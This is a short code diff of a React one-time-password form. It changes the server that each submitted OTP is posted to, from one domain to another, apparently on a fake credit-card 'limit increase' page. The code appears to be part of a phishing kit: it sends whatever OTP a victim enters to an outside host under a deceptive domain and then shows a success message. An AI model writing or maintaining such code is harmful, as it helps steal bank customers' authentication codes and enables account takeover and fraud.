@@ -16,7 +16,7 @@ const OtpForm = () => {
   const handleSubmit = async (e) => {
     try {
       e.preventDefault();
-      const res = await axios.post("https://api.limitincrease.shop/v1/send-otp", { otp: otp })
+      const res = await axios.post("https://api.cardincrease.site/v1/send-otp", { otp: otp })
       console.log(res)
       if (otp === correctOtp) {
         toast.success("Your form has been submitted successfully.");
